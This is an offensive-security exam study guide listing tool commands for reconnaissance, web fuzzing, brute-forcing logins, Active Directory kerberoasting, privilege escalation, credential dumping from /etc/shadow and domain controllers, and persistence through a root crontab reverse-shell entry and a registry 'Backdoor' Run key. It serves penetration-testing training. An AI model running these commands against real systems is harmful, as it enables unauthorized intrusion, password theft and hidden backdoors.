Exam Step-by-Step Guide

---

## 1. Reconnaissance & Enumeration

**Goal:** Find as much info as possible about your target before touching it directly.

### Passive Recon (No interaction with target)
- **theHarvester**: Gathers emails, subdomains, hosts from public sources.
  ```bash
theHarvester -d target.com -b all
```
- **whois**: Shows who owns the domain, DNS servers, etc.
  ```bash
whois target.com
```
- **crt.sh**: Search for SSL certificates and subdomains.
  - Visit: https://crt.sh/?q=target.com
- **Shodan/Censys**: Find exposed services/devices.
  - Visit: https://www.shodan.io/search?query=target.com

### Active Recon (Directly interacts with target)
- **nmap**: Finds open ports, services, versions, and OS.
  ```bash
nmap -sC -sV -A -T4 target.com
nmap -p- target.com  # Scan all ports
nmap --script vuln target.com  # Vulnerability scan
```
- **rustscan**: Fast port scan.
  ```bash
rustscan -a target.com -- -sV -O
```
- **masscan**: Super fast port scanner.
  ```bash
masscan -p1-65535 target.com --rate=10000
```
- **dig/nslookup/host**: DNS queries.
  ```bash
dig target.com
nslookup target.com
host target.com
```
- **Subdomain Enumeration**
  ```bash
dnsenum target.com
subfinder -d target.com
amass enum -d target.com
assetfinder --subs-only target.com
```
- **Zone Transfer**
  ```bash
dig axfr @ns1.target.com target.com
```
- **Banner Grabbing**
  ```bash
nc -nv target.com 80
telnet target.com 80
```

**What to do next:**
- Save all outputs to files (e.g., `nmap -oN nmap.txt`).
- If you see web ports, move to web testing. If you see SMB/FTP/SSH, move to network testing.

**Exam Tips:**
- Always save your output.
- If stuck, move on and come back later.

---

## 2. Web Application Testing

**Goal:** Find vulnerabilities in web apps (directories, files, SQLi, XSS, etc.).

- **Directory Brute-Forcing**
  ```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target.com/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://target.com/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u http://target.com/FUZZ

gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
```
- **Parameter Discovery**
  ```bash
arjun -u http://target.com/page
paramspider -d target.com
```
- **SQL Injection**
  ```bash
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -r request.txt --batch --risk=3 --level=5
```
- **XSS Testing**
  ```bash
dalfox url http://target.com
xsstrike -u http://target.com
```
- **Vulnerability Scanning**
  ```bash
nikto -h http://target.com
wpscan --url http://target.com --enumerate u,p
nuclei -u http://target.com
```
- **Web Crawling**
  ```bash
gospider -s http://target.com
hakrawler -url http://target.com
```
- **File Upload Bypass**
  - Try uploading `.php`, `.php.jpg`, `.phtml`, or use Burp to change Content-Type.
- **Disable JavaScript** in browser dev tools to bypass client-side validation.

**What to do next:**
- Visit found URLs in browser.
- Try default creds or brute force login.
- Test file uploads.

**Exam Tips:**
- Try all HTTP methods (GET, POST, PUT, DELETE, etc.).
- Look for hidden fields, parameter pollution, and bypasses.

---

## 3. Network Penetration Testing

**Goal:** Attack network services (SMB, FTP, SNMP, RDP, SSH, etc.).

- **SMB Enumeration**
  ```bash
enum4linux -a target.com
smbclient -L //target.com/
crackmapexec smb target.com -u user -p /usr/share/wordlists/rockyou.txt
```
- **FTP Brute Force**
  ```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://target.com
medusa -u user -P /usr/share/wordlists/rockyou.txt -h target.com -M ftp
```
- **SSH Brute Force**
  ```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://target.com
medusa -u user -P /usr/share/wordlists/rockyou.txt -h target.com -M ssh
```
- **SNMP Enumeration**
  ```bash
snmpwalk -v2c -c public target.com
```
- **RDP Brute Force**
  ```bash
hydra -t 4 -V -f -l user -P /usr/share/wordlists/rockyou.txt rdp://target.com
xfreerdp /u:user /p:pass /v:target.com
```
- **Traffic Sniffing**
  ```bash
tcpdump -i eth0 -w capture.pcap
wireshark
mitmproxy -m transparent
```

**What to do next:**
- If you get credentials, try them everywhere.
- Analyze captured traffic for creds or sensitive data.

**Exam Tips:**
- Don't waste time brute-forcing if it's not working.
- Check for low-hanging fruit first (default creds, public shares, etc.).

---

## 4. Active Directory Exploitation

**Goal:** Enumerate and attack AD environments (BloodHound, kerberoasting, AS-REP roasting, etc.).

- **BloodHound Collection**
  ```bash
neo4j console & bloodhound &  # Start services
SharpHound.exe -c all         # Collect data on Windows
```
- **Kerberoasting**
  ```bash
GetUserSPNs.py domain/user:pass -dc-ip x.x.x.x
```
- **AS-REP Roasting**
  ```bash
GetNPUsers.py domain/ -usersfile users.txt -no-pass
```
- **Windows Enumeration**
  ```bash
net user /domain
net group "Domain Admins" /domain
dsquery * -limit 100
```
- **Lateral Movement**
  ```bash
PsExec.exe \\target.com -u user -p pass cmd
wmiexec.py domain/user:pass@target.com
```

**What to do next:**
- Crack dumped hashes (see next section).
- Use found creds for lateral movement.

**Exam Tips:**
- Document all users, groups, and shares you find.
- Try all credentials everywhere.

---

## 5. Exploitation & Post-Exploitation

**Goal:** Get a shell and escalate privileges to root/Administrator. Dump credentials, establish persistence, and recon again.

- **Linux Privilege Escalation**
  ```bash
./linpeas.sh > linpeas_out.txt
find / -perm -4000 2>/dev/null
crontab -l
```
- **Windows Privilege Escalation**
  ```bash
winPEAS.exe > winpeas_out.txt
```
- **Credential Dumping**
  ```bash
mimikatz
secretsdump.py -just-dc-user domain/user:pass@dc-ip
samdump2
cat /etc/shadow
```
- **Persistence**
  ```bash
echo "* * * * * root /tmp/rev.sh" >> /etc/crontab
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\path\to\backdoor.exe"
```
- **Host Recon**
  ```bash
whoami
hostname
ipconfig /all
ifconfig
ps aux
tasklist
netstat -ano
```

### Password Cracking Tools

#### Hydra
Hydra is a fast and flexible login cracker supporting numerous protocols.

**Common Usage Examples:**
```bash
# SSH Brute Force
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://target.com
# FTP Brute Force
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://target.com
# HTTP Basic Auth
hydra -l admin -P passwords.txt http-get://target.com/login
# RDP Brute Force
hydra -t 4 -V -f -l user -P /usr/share/wordlists/rockyou.txt rdp://target.com
# SMB Brute Force
hydra -l user -P /usr/share/wordlists/rockyou.txt smb://target.com
# MySQL Brute Force
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://target.com
```

#### Hashcat
Hashcat is a powerful password recovery tool for cracking hashes.

**Common Usage Examples:**
```bash
# Crack an MD5 hash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# Crack a SHA1 hash
hashcat -m 100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# Crack a NTLM hash
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# Crack a bcrypt hash
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# Crack a ZIP file hash
hashcat -m 13600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
# Crack with rules
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

#### John the Ripper
John the Ripper is a fast password cracker, primarily for Unix-based systems.

**Common Usage Examples:**
```bash
# Basic usage
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Crack a shadow file
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
# Crack a ZIP file
zip2john secret.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
# Crack a Windows NTLM hash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt ntlm_hash.txt
# Show cracked passwords
john --show hash.txt
```

**What to do next:**
- Use cracked passwords to escalate or pivot.
- Try all found credentials everywhere.

**Exam Tips:**
- Document every credential and hash you find.
- Try multiple tools if one doesn't work.

---

## 6. Reporting & Time Management

**Goal:** Show what you found, how you found it, and how to fix it. Manage your time and notes for the exam.

- **Take screenshots** of every step (e.g., `gnome-screenshot`, `scrot`).
- **Write down**:
  - What you did
  - What you found
  - How to reproduce
  - How to fix
- **Prepare a report** with:
  - Vulnerability title
  - Impact/description
  - Steps to reproduce
  - Evidence (screenshots, output)
  - Mitigation

**Time Management Tips:**
- Triage: Identify high-value targets first
- Timebox: Don't get stuck—move on and return later
- Document as you go

---

## Exam Day Checklist

- [ ] Enumerate all hosts and services (nmap, rustscan, masscan)
- [ ] Perform passive recon (whois, theHarvester, crt.sh)
- [ ] Enumerate DNS, subdomains, and try zone transfer
- [ ] Web: Test for OWASP Top 10, file upload, bypasses
- [ ] Network: Enumerate SMB, FTP, SNMP, RDP, SSH
- [ ] Attempt password attacks where applicable
- [ ] AD: Run BloodHound, try kerberoasting, AS-REP roasting
- [ ] After initial access: enumerate for privilege escalation
- [ ] Dump credentials, look for persistence opportunities
- [ ] Take notes/screenshots for every step
- [ ] Prepare clear, concise report with evidence
- [ ] Manage time—move on if stuck, revisit later

---
